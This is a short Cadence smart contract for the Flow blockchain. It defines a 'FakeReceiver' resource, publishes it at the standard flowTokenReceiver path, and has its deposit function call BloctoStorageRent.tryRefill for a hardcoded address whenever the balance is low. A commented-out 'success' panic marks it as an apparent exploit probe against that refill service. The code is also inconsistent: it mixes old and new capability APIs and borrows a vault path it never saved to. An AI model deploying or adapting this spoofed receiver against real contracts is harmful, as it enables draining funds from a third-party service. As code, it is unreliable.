import BloctoStorageRent from "../0x1dfd1e5b87b847dc/BloctoStorageRent.cdc"

import FlowToken from "./../../standardsV1/FlowToken.cdc"

import FungibleToken from "./../../standardsV1/FungibleToken.cdc"

access(all)
contract new{ 
	init(){ 
		var vault <- FlowToken.createEmptyVault(vaultType: Type<@FlowToken.Vault>())
		self.account.storage.save(<-vault, to: /storage/vault)
		var fake <- create FakeReceiver()
		self.account.storage.save(<-fake, to: /storage/fake)
		var capability_1 =
			self.account.capabilities.storage.issue<&{FungibleToken.Receiver}>(/storage/fake)
		self.account.capabilities.publish(capability_1, at: /public/flowTokenReceiver)
		self.account.unlink(/public/flowTokenReceiver)
	}
	
	access(all)
	resource FakeReceiver: FungibleToken.Receiver{ 
		access(all)
		fun deposit(from: @{FungibleToken.Vault}){ 
			var vault = new.account.storage.borrow<&FlowToken.Vault>(from: /storage/flowTokenVault)!
			vault.deposit(from: <-from)
			if vault.balance < 0.006{ 
				BloctoStorageRent.tryRefill(0xaacd320d78166246)
				return
			}
		//panic("success")
		}
		
		access(all)
		view fun getSupportedVaultTypes():{ Type: Bool}{ 
			panic("implement me")
		}
		
		access(all)
		view fun isSupportedVaultType(type: Type): Bool{ 
			panic("implement me")
		}
	}
}
